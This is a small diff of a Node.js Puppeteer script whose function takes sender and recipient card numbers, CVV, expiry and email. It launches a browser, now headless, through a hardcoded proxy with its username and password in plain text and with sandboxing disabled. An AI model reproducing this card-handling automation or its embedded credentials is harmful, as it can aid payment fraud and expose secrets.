@@ -43,7 +43,7 @@ const write_data = async (inputs, page, browser) => {
      await browser.close()
 }
 const send_html = async (toCard, amount, fromCard,cvv, expireDate, email) => {
-    const browser = await puppeteer.launch({headless: false, args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
+    const browser = await puppeteer.launch({args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
     const page = await browser.newPage()
     await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
     await page.setViewport({ width: 1920, height: 984 })
